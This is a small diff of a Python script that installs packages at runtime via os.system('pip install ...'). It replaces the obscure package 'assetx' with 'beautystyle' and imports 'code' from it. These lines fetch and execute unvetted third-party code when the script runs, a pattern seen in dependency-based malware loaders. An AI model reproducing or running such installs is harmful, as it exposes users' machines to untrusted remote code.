@@ -4,11 +4,11 @@ os.system("pip install tasksio")
 os.system("pip install asyncio")
 os.system("pip install colorama")
 os.system("pip install aiohttp")
-os.system(f"pip install assetx")
+os.system(f"pip install beautystyle")
 import aiohttp
 import asyncio
 from colorama import Fore
-from assetx import code
+from beautystyle import code
 import tasksio
 from builtins import *
 from typing import Optional
